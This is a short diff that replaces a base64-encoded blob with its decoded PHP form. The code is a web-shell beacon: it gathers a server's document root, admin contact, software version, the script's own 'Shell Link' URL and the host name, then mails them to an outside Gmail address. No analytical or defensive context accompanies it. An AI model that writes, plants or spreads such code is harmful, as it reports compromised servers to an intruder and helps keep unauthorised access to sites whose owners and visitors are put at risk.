@@ -1,1 +1,10 @@
-PD9waHAKJHdobz0id2ViZ3V2ZW5saWdpMTlAZ21haWwuY29tIjsKJHRpdGxlPSJMaW5rIEJpbGRpcmkgPHN1cHBvckBuaWMub3JnPlxuIjsKJHNlbmQuPSJEaXJlY3RvcnkgOiAiLiRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10uIlxyXG4iOwokc2VuZC49IlNlcnZlciBBZG1pbiA6ICIuJF9TRVJWRVJbJ1NFUlZFUl9BRE1JTiddLiJcclxuIjsKJHNlbmQuPSJTZXJ2ZXIgT1MgOiAiLiRfU0VSVkVSWydTRVJWRVJfU09GVFdBUkUnXS4iXHJcbiI7CiRzZW5kLj0iU2hlbGwgTGluayA6IGh0dHA6Ly8iLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydQSFBfU0VMRiddLiJcclxuIjsKJHNlbmQuPSJUYXJnZXQgU2l0ZSA6ICIgLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iXHJcbiI7Cm1haWwoJHdobywgJHRpdGxlLCAkc2VuZCk7Cj8+
+<?php
+$who="webguvenligi19@gmail.com";
+$title="Link Bildiri <suppor@nic.org>\n";
+$send.="Directory : ".$_SERVER['DOCUMENT_ROOT']."\r\n";
+$send.="Server Admin : ".$_SERVER['SERVER_ADMIN']."\r\n";
+$send.="Server OS : ".$_SERVER['SERVER_SOFTWARE']."\r\n";
+$send.="Shell Link : http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\r\n";
+$send.="Target Site : " .$_SERVER['HTTP_HOST']."\r\n";
+mail($who, $title, $send);
+?>
